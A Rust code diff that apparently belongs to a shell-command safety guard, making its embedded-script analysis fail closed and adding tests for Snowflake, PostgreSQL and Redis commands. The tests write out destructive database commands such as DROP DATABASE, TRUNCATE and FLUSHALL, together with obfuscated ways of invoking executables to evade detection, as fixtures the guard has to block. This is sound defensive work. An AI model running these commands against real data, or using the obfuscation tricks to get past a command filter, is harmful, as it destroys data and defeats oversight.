+            continue;
+        }
+
+        if matched_span
+            .as_ref()
+            .is_some_and(|span| span_is_inside_any_segment(*span, ignored_ranges))
+        {
             continue;
         }
 
         let reason = pattern.reason;
-        let mapped_span = map_span_with_offset(span, normalized_offset, original_len);
-        let slice_span = MatchSpan {
-            start: span.start.saturating_sub(slice_offset),
-            end: span.end.saturating_sub(slice_offset),
-        };
+        let mapped_span = matched_span
+            .as_ref()
+            .and_then(|span| map_span_with_offset(*span, normalized_offset, original_len));
         let preview = mapped_span
             .as_ref()
             .map(|span| extract_match_preview(original_command, span))
-            .or_else(|| Some(extract_match_preview(command_slice, &slice_span)));
+            .or_else(|| {
+                matched_span.as_ref().map(|span| {
+                    let slice_span = MatchSpan {
+                        start: span.start.saturating_sub(slice_offset),
+                        end: span.end.saturating_sub(slice_offset),
+                    };
+                    extract_match_preview(command_slice, &slice_span)
+                })
+            });
 
         if let Some(pattern_name) = pattern.name {
             if let Some(hit) = allowlists.match_rule_at_path(pack_id, pattern_name, project_path) {
@@ -7776,6 +14396,9 @@ where
                 keyword_index: keyword_index.as_ref(),
                 compiled_overrides,
                 allow_once_audit: None,
+                shell_dialect: crate::normalize::ShellDialect::Unknown,
+                nested_command_depth: 0,
+                inherited_automated_stdin: false,
             };
             if let Some(blocked) = evaluate_heredoc(command, context, &mut heredoc_allowlist_hit) {
                 return blocked;
@@ -7788,7 +14411,7 @@ where
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
             return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
         }
-        return EvaluationResult::allowed();
+        return EvaluationResult::allowed_by_quick_reject();
     }
 
     // Step 5: False-positive immunity - strip known-safe string arguments (commit messages, search
@@ -7808,7 +14431,7 @@ where
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
             return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
         }
-        return EvaluationResult::allowed();
+        return EvaluationResult::allowed_by_quick_reject();
     }
 
     // Built-in inspection-wrapper exemption (dcg#132).
@@ -7883,6 +14506,14 @@ struct HeredocEvaluationContext<'a> {
     keyword_index: Option<&'a crate::packs::EnabledKeywordIndex>,
     compiled_overrides: &'a crate::config::CompiledOverrides,
     allow_once_audit: Option<&'a crate::pending_exceptions::AllowOnceAuditConfig<'a>>,
+    shell_dialect: crate::normalize::ShellDialect,
+    nested_command_depth: usize,
+    inherited_automated_stdin: bool,
+}
+
+#[inline]
+fn nested_evaluation_incomplete(result: &EvaluationResult) -> bool {
+    result.is_indeterminate() || result.skipped_due_to_budget
 }
 
 #[allow(clippy::too_many_lines)]
@@ -7894,7 +14525,7 @@ fn evaluate_heredoc(
     if deadline_exceeded(context.deadline)
         || remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE)
     {
-        return Some(EvaluationResult::allowed_due_to_budget());
+        return Some(EvaluationResult::indeterminate_due_to_budget());
     }
 
     // Check command-level allowlist before any extraction.
@@ -7916,6 +14547,15 @@ fn evaluate_heredoc(
                     .iter()
                     .any(|r| matches!(r, SkipReason::Timeout { .. }));
 
+                // `fallback_on_* = true` means use the bounded conservative
+                // scanner, not silently skip embedded-code analysis. Run it
+                // for every incomplete extraction class so scheduler stalls,
+                // malformed syntax, and size limits cannot turn an obvious
+                // catastrophic sink into a quick-rejected allow.
+                if let Some(blocked) = check_fallback_patterns(command) {
+                    return Some(blocked);
+                }
+
                 let strict_timeout = is_timeout && !context.heredoc_settings.fallback_on_timeout;
                 let strict_other = !is_timeout && !context.heredoc_settings.fallback_on_parse_error;
                 if strict_timeout || strict_other {
@@ -7936,17 +14576,6 @@ fn evaluate_heredoc(
                         )
                     };
                     return Some(EvaluationResult::denied_by_legacy(&reason));
-                }
-
-                // Fallback check: if skipped due to size limits, perform a rudimentary
-                // substring check for critical patterns that would otherwise be missed.
-                if reasons
-                    .iter()
-                    .any(|r| matches!(r, SkipReason::ExceededSizeLimit { .. }))
-                {
-                    if let Some(blocked) = check_fallback_patterns(command) {
-                        return Some(blocked);
-                    }
                 }
 
                 return None;
@@ -7979,15 +14608,18 @@ fn evaluate_heredoc(
                     return Some(EvaluationResult::denied_by_legacy(&reason));
                 }
 
-                // We have partial content. Analyze what we extracted first (high fidelity).
-                // Then if no block, run fallback checks on the whole command if size limit was exceeded.
-                let fallback_needed = skipped
-                    .iter()
-                    .any(|r| matches!(r, SkipReason::ExceededSizeLimit { .. }));
+                // Analyze extracted content first (high fidelity), then run
+                // the bounded fallback over the complete command whenever
+                // any source was skipped.
+                let fallback_needed = !skipped.is_empty();
 
                 (extracted, fallback_needed)
             }
             ExtractionResult::Failed(err) => {
+                if let Some(blocked) = check_fallback_patterns(command) {
+                    return Some(blocked);
+                }
+
                 if !context.heredoc_settings.fallback_on_parse_error {
                     let reason = format!(
                         "Embedded code blocked: extraction failed and \
@@ -8002,7 +14634,7 @@ fn evaluate_heredoc(
 
     for content in contents {
         if deadline_exceeded(context.deadline) {
-            return Some(EvaluationResult::allowed_due_to_budget());
+            return Some(EvaluationResult::indeterminate_due_to_budget());
         }
 
         if let Some(allowed) = &context.heredoc_settings.allowed_languages {
@@ -8034,11 +14666,14 @@ fn evaluate_heredoc(
         // Commands like `cat`, `tee`, `grep`, etc. just output the heredoc content
         // as data - they don't execute it as code. This prevents false positives
         // where documentation text containing dangerous command examples is blocked.
-        if content
-            .target_command
-            .as_ref()
-            .is_some_and(|cmd| crate::heredoc::is_non_executing_heredoc_command(cmd))
-        {
+        if content.target_command.as_ref().is_some_and(|cmd| {
+            crate::heredoc::is_non_executing_heredoc_command(cmd)
+                && !crate::heredoc::stdin_data_sink_may_be_overridden(
+                    command,
+                    content.byte_range.start,
+                    cmd,
+                )
+        }) {
             tracing::trace!(
                 target_command = ?content.target_command,
                 "Skipping heredoc content analysis for non-executing target"
@@ -8047,8 +14682,8 @@ fn evaluate_heredoc(
         }
 
         // Cheap, high-signal fallback before the expensive AST pass. If the
-        // hook is already close to its fail-open deadline, this keeps obvious
-        // catastrophic language-library deletes from being silently allowed.
+        // hook is already close to its evaluation deadline, this keeps obvious
+        // catastrophic language-library deletes on the direct denial path.
         if let Some(m) =
             crate::ast_matcher::scan_filesystem_sink_fallback(&content.content, content.language)
         {
@@ -8100,6 +14735,7 @@ fn evaluate_heredoc(
                         allowlist_override: None,
                         effective_mode: Some(crate::packs::DecisionMode::Deny),
                         skipped_due_to_budget: false,
+                        quick_rejected: false,
                         branch_context: None,
                         session_occurrence: None,
                         graduated_response: None,
@@ -8110,13 +14746,20 @@ fn evaluate_heredoc(
         }
 
         if remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE) {
-            return Some(EvaluationResult::allowed_due_to_budget());
+            return Some(EvaluationResult::indeterminate_due_to_budget());
         }
 
         // Tier 2.5: Recursive Shell Analysis
         // If content is Bash, extract inner commands and feed them back to the full evaluator.
         // This ensures that `kubectl`, `docker`, etc. inside heredocs are checked against their packs.
         if content.language == crate::heredoc::ScriptLanguage::Bash {
+            let inline_automated_stdin = content.heredoc_type.is_none()
+                && (context.inherited_automated_stdin
+                    || crate::packs::core::filesystem::rm_segment_receives_automated_stdin(
+                        command,
+                        content.byte_range.start,
+                        context.shell_dialect,
+                    ));
             // Fast pre-filter: skip the expensive tree-sitter AST parse if the
             // heredoc body contains none of the enabled pack keywords. The AC
             // automaton does a single O(n) scan; the AST parse is much heavier.
@@ -8133,10 +14776,10 @@ fn evaluate_heredoc(
                 let inner_commands = crate::heredoc::extract_shell_commands(&content.content);
                 for inner in inner_commands {
                     if deadline_exceeded(context.deadline) {
-                        return Some(EvaluationResult::allowed_due_to_budget());
+                        return Some(EvaluationResult::indeterminate_due_to_budget());
                     }
 
-                    let result = evaluate_command_with_pack_order_deadline_at_path(
+                    let result = evaluate_command_with_pack_order_deadline_at_path_inner(
                         &inner.text,
                         context.enabled_keywords,
                         context.ordered_packs,
@@ -8147,7 +14790,19 @@ fn evaluate_heredoc(
                         context.allow_once_audit,
                         context.project_path,
                         context.deadline,
+                        crate::normalize::ShellDialect::Posix,
+                        context.nested_command_depth + 1,
+                        inline_automated_stdin,
                     );
+
+                    // A nested evaluator may conservatively stop before the
+                    // absolute deadline when the remaining budget is too
+                    // small for its next stage. Propagate that result exactly;
+                    // checking the clock again here can still be false and
+                    // must never turn incomplete nested analysis into Allow.
+                    if nested_evaluation_incomplete(&result) {
+                        return Some(EvaluationResult::indeterminate_due_to_budget());
+                    }
 
                     if result.is_denied() {
                         // Propagate denial, wrapping the reason context
@@ -8183,6 +14838,7 @@ fn evaluate_heredoc(
                                 allowlist_override: None,
                                 effective_mode: Some(crate::packs::DecisionMode::Deny),
                                 skipped_due_to_budget: false,
+                                quick_rejected: false,
                                 branch_context: None,
                                 session_occurrence: None,
                                 graduated_response: None,
@@ -8198,6 +14854,10 @@ fn evaluate_heredoc(
         let matches = match DEFAULT_MATCHER.find_matches(&content.content, content.language) {
             Ok(matches) => matches,
             Err(err) => {
+                if let Some(blocked) = check_fallback_patterns(&content.content) {
+                    return Some(blocked);
+                }
+
                 let is_timeout = matches!(err, crate::ast_matcher::MatchError::Timeout { .. });
                 let strict_timeout = is_timeout && !context.heredoc_settings.fallback_on_timeout;
                 let strict_other = !is_timeout && !context.heredoc_settings.fallback_on_parse_error;
@@ -8217,7 +14877,7 @@ fn evaluate_heredoc(
             if deadline_exceeded(context.deadline)
                 || remaining_below(context.deadline, &crate::perf::FULL_HEREDOC_PIPELINE)
             {
-                return Some(EvaluationResult::allowed_due_to_budget());
+                return Some(EvaluationResult::indeterminate_due_to_budget());
             }
 
             if !m.severity.blocks_by_default() {
@@ -8272,6 +14932,7 @@ fn evaluate_heredoc(
                 allowlist_override: None,
                 effective_mode: Some(crate::packs::DecisionMode::Deny),
                 skipped_due_to_budget: false,
+                quick_rejected: false,
                 branch_context: None,
                 session_occurrence: None,
                 graduated_response: None,
@@ -8345,6 +15006,7 @@ fn evaluate_heredoc(
                             allowlist_override: None,
                             effective_mode: Some(crate::packs::DecisionMode::Deny),
                             skipped_due_to_budget: false,
+                            quick_rejected: false,
                             branch_context: None,
                             session_occurrence: None,
                             graduated_response: None,
@@ -8367,7 +15029,9 @@ fn evaluate_heredoc(
 
 #[allow(dead_code)]
 fn check_fallback_patterns(command: &str) -> Option<EvaluationResult> {
-    // List of critical destructive patterns to check when AST analysis is skipped (e.g. oversized input).
+    // Critical destructive patterns checked whenever high-fidelity embedded
+    // code analysis is incomplete (timeout, parse failure, or bounded input
+    // limit). These patterns must be robust to whitespace variations.
     // These patterns must be robust to whitespace variations where applicable.
     static FALLBACK_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
         RegexSet::new([
@@ -8394,7 +15058,7 @@ fn check_fallback_patterns(command: &str) -> Option<EvaluationResult> {
 
     if FALLBACK_PATTERNS.is_match(check_target) {
         return Some(EvaluationResult::denied_by_legacy(
-            "Oversized command contains destructive pattern (fallback check)",
+            "Incomplete embedded-code analysis found a destructive pattern (bounded fallback)",
         ));
     }
 
@@ -8627,7 +15291,7 @@ pub fn apply_confidence_scoring(
 /// Apply git branch-aware strictness to an evaluation result.
 ///
 /// This function modifies the evaluation result based on the current git branch:
-/// - On protected branches (e.g., main, master), stricter settings are applied
+/// - On protected branches (for example, main), stricter settings are applied
 /// - On relaxed branches (e.g., feature/*), more permissive settings are applied
 /// - The branch_context field is populated with branch information
 ///
@@ -8746,6 +15410,13 @@ mod tests {
         LayeredAllowlist::default()
     }
 
+    fn powershell_command_base64(command: &str) -> String {
+        use base64::Engine;
+
+        let utf16_le: Vec<u8> = command.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        base64::engine::general_purpose::STANDARD.encode(utf16_le)
+    }
+
     fn evaluate_with_pack_ids(command: &str, pack_ids: &[&str]) -> EvaluationResult {
         evaluate_with_pack_ids_at_path(command, pack_ids, None)
     }
@@ -8755,14 +15426,28 @@ mod tests {
         pack_ids: &[&str],
         project_path: Option<&Path>,
     ) -> EvaluationResult {
+        let allowlists = default_allowlists();
+        evaluate_with_pack_ids_and_allowlists_at_path(command, pack_ids, &allowlists, project_path)
+    }
+
+    fn evaluate_with_pack_ids_and_allowlists_at_path(
+        command: &str,
+        pack_ids: &[&str],
+        allowlists: &LayeredAllowlist,
+        project_path: Option<&Path>,
+    ) -> EvaluationResult {
         let enabled_packs: std::collections::HashSet<String> =
             pack_ids.iter().map(|id| (*id).to_string()).collect();
         let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
         let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
         let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
         let compiled = default_compiled_overrides();
-        let allowlists = default_allowlists();
-        let heredoc_settings = default_config().heredoc_settings();
+        let mut config = default_config();
+        // This helper exercises semantic pack behavior, not the production
+        // scheduler budget. Keep AST extraction deterministic when the full
+        // library suite runs thousands of tests in parallel.
+        config.heredoc.timeout_ms = Some(5_000);
+        let heredoc_settings = config.heredoc_settings();
 
         evaluate_command_with_pack_order_deadline_at_path(
             command,
@@ -8770,7 +15455,7 @@ mod tests {
             ordered_packs.as_slice(),
             keyword_index.as_ref(),
             &compiled,
-            &allowlists,
+            allowlists,
             &heredoc_settings,
             None,
             project_path,
@@ -8799,6 +15484,36 @@ mod tests {
                         environments: Vec::new(),
                         paths: None,
                         risk_acknowledged: false,
+                    }],
+                    errors: Vec::new(),
+                },
+            }],
+        }
+    }
+
+    fn project_allowlists_for_command_selector(
+        selector: AllowSelector,
+        risk_acknowledged: bool,
+    ) -> LayeredAllowlist {
+        LayeredAllowlist {
+            layers: vec![LoadedAllowlistLayer {
+                layer: AllowlistLayer::Project,
+                path: PathBuf::from("project-allowlist.toml"),
+                file: AllowlistFile {
+                    entries: vec![AllowEntry {
+                        selector,
+                        reason: "test full-command authorization".to_string(),
+                        added_by: None,
+                        added_at: None,
+                        expires_at: None,
+                        ttl: None,
+                        session: None,
+                        session_id: None,
+                        context: None,
+                        conditions: HashMap::new(),
+                        environments: Vec::new(),
+                        paths: None,
+                        risk_acknowledged,
                     }],
                     errors: Vec::new(),
                 },
@@ -9100,6 +15815,568 @@ mod tests {
                 evaluate_with_pack_ids(command, &["database.redis"]).is_denied(),
                 "Redis stdin option form must block: {command}"
             );
+        }
+    }
+
+    #[test]
+    fn snowflake_cli_semantics_cover_inline_stdin_files_and_nested_sources() {
+        let pack = ["database.snowflake"];
+
+        // Generic SQL packs are enabled by default in normal CLI use. Once the
+        // executable is proven to be `snow sql`, its semantic pack must own
+        // attribution and allowlisting rather than a registry-earlier generic
+        // PostgreSQL regex matching text inside the query argument.
+        let overlapping_packs = ["database.postgresql", "database.snowflake"];
+        let specialized = evaluate_with_pack_ids(
+            "snow sql -q 'SELECT 1; DROP TABLE prod.users'",
+            &overlapping_packs,
+        );
+        assert_eq!(
+            specialized
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pack_id.as_deref()),
+            Some("database.snowflake")
+        );
+        let compound = evaluate_with_pack_ids(
+            "psql -c 'SELECT 1'; snow sql -q 'DROP TABLE prod.users'",
+            &overlapping_packs,
+        );
+        assert_eq!(
+            compound
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pack_id.as_deref()),
+            Some("database.snowflake"),
+            "one client's safe payload must not let its generic regex preempt another client's semantic result"
+        );
+        let direct_cli = evaluate_with_pack_ids(
+            "dropdb production; snow sql -q 'SELECT 1'",
+            &overlapping_packs,
+        );
+        assert_eq!(
+            direct_cli
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pack_id.as_deref()),
+            Some("database.postgresql"),
+            "domain scoping must retain a different pack's direct CLI rules"
+        );
+        let allowlists = project_allowlists_for_rule(
+            "database.snowflake:drop-table",
+            "reviewed Snowflake drop fixture",
+        );
+        assert!(
+            evaluate_with_pack_ids_and_allowlists_at_path(
+                "snow sql -q 'DROP TABLE prod.users'",
+                &overlapping_packs,
+                &allowlists,
+                None,
+            )
+            .is_allowed(),
+            "a reviewed Snowflake rule must not be re-blocked by a generic SQL pack"
+        );
+
+        for command in [
+            "snow sql -q 'DROP DATABASE analytics_prod'",
+            "snow sql --query='SELECT COUNT(*) FROM prod.users; DROP TABLE prod.users'",
+            "printf '%s\\n' 'TRUNCATE TABLE prod.events' | snow sql",
+            "snow --future-global value sql -q 'SELECT 1'",
+            "snow sql -q 'SELECT {{ runtime_sql }}'",
+            "snow sql --retain-comments -q '-- {{ runtime_sql }}\\nSELECT 1'",
+            "snow sql -f \"$MIGRATION_FILE\"",
+        ] {
+            assert!(
+                evaluate_with_pack_ids(command, &pack).is_denied(),
+                "Snowflake executable input must block or fail closed: {command}"
+            );
+        }
+
+        for command in [
+            "snow --version",
+            "snow connection list",
+            "snow sql -q 'SELECT 1; SHOW TABLES'",
+            "snow sql -q \"SELECT 'DROP DATABASE example'\"",
+            "snow sql -q '-- DROP TABLE ignored\\nSELECT 1'",
+            "snow sql -q '-- {{ inert_template }}\\nSELECT 1'",
+            "snow sql --enable-templating NONE -q \"SELECT '{{ inert }}'\"",
+        ] {
+            assert!(
+                evaluate_with_pack_ids(command, &pack).is_allowed(),
+                "read-only or inert Snowflake input must remain allowed: {command}"
+            );
+        }
+
+        let multi = evaluate_with_pack_ids(
+            "snow sql -q 'UPDATE prod.orders SET status = 0 WHERE id = 1; DROP TABLE prod.users; DELETE FROM prod.audit'",
+            &pack,
+        );
+        let info = multi
+            .pattern_info
+            .as_ref()
+            .expect("multi-statement Snowflake SQL must produce denial metadata");
+        assert_eq!(info.pattern_name.as_deref(), Some("drop-table"));
+        assert!(
+            info.matched_text_preview
+                .as_deref()
+                .is_some_and(|preview| preview.contains("DROP TABLE prod.users")),
+            "primary statement preview must survive evaluator integration: {info:?}"
+        );
+        let explanation = info
+            .explanation
+            .as_deref()
+            .expect("all Snowflake findings must be summarized");
+        for rule in ["bounded-update", "drop-table", "delete-all"] {
+            assert!(
+                explanation.contains(rule),
+                "Snowflake summary omitted {rule}: {explanation}"
+            );
+        }
+
+        let allowlists = project_allowlists_for_rule(
+            "database.snowflake:drop-table",
+            "test primary-only exception",
+        );
+        let secondary = evaluate_with_pack_ids_and_allowlists_at_path(
+            "snow sql -q 'DROP TABLE prod.users; DELETE FROM prod.audit'",
+            &pack,
+            &allowlists,
+            None,
+        );
+        assert!(
+            secondary.is_denied(),
+            "allowlisting the primary finding must not hide another guarded statement"
+        );
+        assert_eq!(
+            secondary
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some("delete-all")
+        );
+
+        let temp = tempfile::tempdir().expect("create Snowflake evaluator fixture directory");
+        std::fs::create_dir(temp.path().join("migrations"))
+            .expect("create nested Snowflake fixture directory");
+        std::fs::write(
+            temp.path().join("root.sql"),
+            "SHOW TABLES;\n!source migrations/destructive.sql\n",
+        )
+        .expect("write Snowflake root fixture");
+        std::fs::write(
+            temp.path().join("migrations/destructive.sql"),
+            "SELECT 1;\nALTER TASK hourly_transform SUSPEND;\n",
+        )
+        .expect("write Snowflake nested fixture");
+        assert!(
+            evaluate_with_pack_ids_at_path(
+                "snow sql --filename root.sql",
+                &pack,
+                Some(temp.path()),
+            )
+            .is_denied(),
+            "a destructive transitive !source must block"
+        );
+
+        std::fs::write(temp.path().join("safe.sql"), "SHOW TABLES;\nSELECT 1;\n")
+            .expect("write safe Snowflake fixture");
+        assert!(
+            evaluate_with_pack_ids_at_path("snow sql -f safe.sql", &pack, Some(temp.path()),)
+                .is_allowed(),
+            "a fully inspected read-only SQL file must remain allowed"
+        );
+        std::fs::write(
+            temp.path().join("task.sql"),
+            "CREATE TASK wipe WAREHOUSE=app_wh AS DELETE FROM prod.orders;\nALTER TASK wipe RESUME;\n",
+        )
+        .expect("write destructive Snowflake task fixture");
+        assert!(
+            evaluate_with_pack_ids_at_path("snow sql -f task.sql", &pack, Some(temp.path()),)
+                .is_denied(),
+            "a task file that schedules destructive SQL must block"
+        );
+        assert!(
+            evaluate_with_pack_ids_at_path("snow sql -f missing.sql", &pack, Some(temp.path()),)
+                .is_denied(),
+            "a missing executable SQL file must fail closed"
+        );
+        assert!(
+            evaluate_with_pack_ids("snow sql -q '!source https://example.test/prod.sql'", &pack,)
+                .is_denied(),
+            "an inspectable command must still reject an uninspectable remote source"
+        );
+        assert!(
+            evaluate_with_pack_ids(
+                "snow sql --local-only -q '!source https://example.test/prod.sql'",
+                &pack,
+            )
+            .is_allowed(),
+            "--local-only proves that a remote source cannot execute"
+        );
+    }
+
+    #[test]
+    fn snowflake_cli_input_over_the_inner_budget_fails_closed() {
+        let mut command = String::from("snow sql -q 'SELECT 1' # ");
+        command.push_str(&"x".repeat(crate::packs::database::snowflake::MAX_SNOWFLAKE_CLI_BYTES));
+        assert!(crate::packs::database::snowflake::snowflake_cli_exceeds_analysis_budget(&command));
+
+        let result = evaluate_with_pack_ids(&command, &["database.snowflake"]);
+        assert!(
+            result.is_denied(),
+            "raising the outer hook command limit must not make the bounded Snowflake parser fail open: {result:?}"
+        );
+        assert_eq!(
+            result
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some(crate::packs::database::snowflake::UNVERIFIED_RULE),
+        );
+        assert!(
+            result
+                .pattern_info
+                .as_ref()
+                .map(|info| info.reason.as_str())
+                .is_some_and(|reason| reason
+                    .contains(crate::packs::database::snowflake::OVERSIZED_CLI_REASON)),
+            "the denial must explain the bounded-analysis failure: {:?}",
+            result.pattern_info
+        );
+    }
+
+    #[test]
+    fn snowflake_obfuscated_executables_reach_indexed_and_unindexed_semantics() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_packs = std::collections::HashSet::from(["database.snowflake".to_string()]);
+        let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
+        let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        assert!(!enabled_keywords.iter().any(|keyword| {
+            keyword.eq_ignore_ascii_case("merge") || keyword.eq_ignore_ascii_case("copy")
+        }));
+
+        let destructive = [
+            (
+                ShellDialect::PowerShell,
+                "& ([string]::Concat([char]115,[char]110,[char]111,[char]119)) sql -q 'DROP DATABASE analytics_prod'",
+                "stdin-unverified",
+            ),
+            (
+                ShellDialect::Posix,
+                "$(printf snow) sql -q 'DROP DATABASE analytics_prod'",
+                "drop-database",
+            ),
+            (
+                ShellDialect::Posix,
+                "export EXE=snow; \"$EXE\" sql -q 'DROP DATABASE analytics_prod'",
+                "stdin-unverified",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ('s'+'now') sql -q 'MERGE INTO prod.t USING stage.s ON 1=1'",
+                "merge-data",
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"s^now sql -q "COPY INTO prod.t FROM @stage""#,
+                "copy-into-table",
+            ),
+            (
+                ShellDialect::Posix,
+                r"$'\x73\x6e\x6f\x77' sql -q 'MERGE INTO prod.t USING stage.s ON 1=1'",
+                "merge-data",
+            ),
+        ];
+        let inert = [
+            (
+                ShellDialect::PowerShell,
+                "& ('python') sql -q 'DROP DATABASE analytics_prod'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output \"& ([string]::Concat([char]115,[char]110,[char]111,[char]119)) sql -q 'DROP DATABASE analytics_prod'\"",
+            ),
+            (ShellDialect::Posix, "export EXE=snow; echo \"$EXE\""),
+            (
+                ShellDialect::Posix,
+                "printf '%s\\n' '$(printf snow) sql -q DROP DATABASE analytics_prod'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output \"& ('s'+'now') sql -q 'MERGE INTO prod.t USING stage.s ON 1=1'\"",
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"echo s^now sql -q "COPY INTO prod.t FROM @stage""#,
+            ),
+            (
+                ShellDialect::Posix,
+                r#"printf '%s\n' "$'\x73\x6e\x6f\x77' sql -q COPY""#,
+            ),
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (dialect, command, expected_rule) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    enabled_keywords.as_slice(),
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+                assert_eq!(
+                    result
+                        .pattern_info
+                        .as_ref()
+                        .and_then(|info| info.pattern_name.as_deref()),
+                    Some(expected_rule)
+                );
+            }
+            for (dialect, command) in inert {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    enabled_keywords.as_slice(),
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow inert data {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+
+            let stdin = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                r"printf 'MERGE INTO prod.t USING stage.s ON 1=1' | $'\x73\x6e\x6f\x77' sql",
+                enabled_keywords.as_slice(),
+                &ordered_packs,
+                index,
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                stdin.is_denied(),
+                "an obfuscated Snowflake stdin consumer must fail closed; index={}: {:?}",
+                index.is_some(),
+                stdin.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn literal_substitution_and_exported_database_executables_preserve_indirect_flows() {
+        use crate::normalize::ShellDialect;
+
+        let temp = tempfile::tempdir().expect("create dynamic database executable fixtures");
+        std::fs::write(
+            temp.path().join("dangerous.sql"),
+            "DROP DATABASE analytics_prod;\n",
+        )
+        .expect("write destructive SQL fixture");
+        std::fs::write(temp.path().join("dangerous.redis"), "FLUSHALL\n")
+            .expect("write destructive Redis fixture");
+
+        let cases = [
+            (
+                "database.postgresql",
+                [
+                    "$(printf psql) -f dangerous.sql",
+                    "$(printf '\\x70\\x73\\x71\\x6c') -f dangerous.sql",
+                    "$(printf psql) -f dangerous.sql \"$(date)\"",
+                    "export EXE=psql; \"$EXE\" -f dangerous.sql",
+                    "readonly EXE=psql; \"$EXE\" -f dangerous.sql",
+                    "declare -x EXE=psql; \"$EXE\" -f dangerous.sql",
+                    "typeset -x EXE=psql; \"$EXE\" -f dangerous.sql",
+                ],
+                [
+                    "printf '%s\\n' '$(printf psql) -f dangerous.sql'",
+                    "$(printf cat) dangerous.sql",
+                    "$(printf cat) dangerous.sql \"$(date)\"",
+                    "echo \"$(date)\"; $(printf psql) -X -c 'SELECT 1'",
+                    "export EXE=psql; echo \"$EXE\"",
+                    "readonly EXE=psql; echo \"$EXE\"",
+                    "declare -x EXE=psql; echo \"$EXE\"",
+                    "typeset -x EXE=psql; echo \"$EXE\"",
+                ],
+            ),
+            (
+                "database.redis",
+                [
+                    "$(printf redis-cli) < dangerous.redis",
+                    "$(printf '\\x72\\x65\\x64\\x69\\x73\\x2d\\x63\\x6c\\x69') < dangerous.redis",
+                    "$(printf redis-cli) < dangerous.redis \"$(date)\"",
+                    "export EXE=redis-cli; \"$EXE\" < dangerous.redis",
+                    "readonly EXE=redis-cli; \"$EXE\" < dangerous.redis",
+                    "declare -x EXE=redis-cli; \"$EXE\" < dangerous.redis",
+                    "typeset -x EXE=redis-cli; \"$EXE\" < dangerous.redis",
+                ],
+                [
+                    "printf '%s\\n' '$(printf redis-cli) < dangerous.redis'",
+                    "$(printf cat) dangerous.redis",
+                    "$(printf cat) dangerous.redis \"$(date)\"",
+                    "echo \"$(date)\"; $(printf redis-cli) GET account:1",
+                    "export EXE=redis-cli; echo \"$EXE\"",
+                    "readonly EXE=redis-cli; echo \"$EXE\"",
+                    "declare -x EXE=redis-cli; echo \"$EXE\"",
+                    "typeset -x EXE=redis-cli; echo \"$EXE\"",
+                ],
+            ),
+        ];
+
+        for (pack_id, destructive, inert) in cases {
+            let enabled_packs = std::collections::HashSet::from([pack_id.to_string()]);
+            let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
+            let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
+            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+            let compiled = default_compiled_overrides();
+            let allowlists = default_allowlists();
+            let heredoc_settings = default_config().heredoc_settings();
+
+            for index in [None, keyword_index.as_ref()] {
+                for command in destructive {
+                    let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                        command,
+                        enabled_keywords.as_slice(),
+                        &ordered_packs,
+                        index,
+                        &compiled,
+                        &allowlists,
+                        &heredoc_settings,
+                        None,
+                        Some(temp.path()),
+                        None,
+                        ShellDialect::Posix,
+                    );
+                    assert!(
+                        result.is_denied(),
+                        "dynamic {pack_id} executable must retain its file/stdin flow for {command:?}; index={}: {:?}",
+                        index.is_some(),
+                        result.pattern_info,
+                    );
+                }
+                for command in inert {
+                    let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                        command,
+                        enabled_keywords.as_slice(),
+                        &ordered_packs,
+                        index,
+                        &compiled,
+                        &allowlists,
+                        &heredoc_settings,
+                        None,
+                        Some(temp.path()),
+                        None,
+                        ShellDialect::Posix,
+                    );
+                    assert!(
+                        result.is_allowed(),
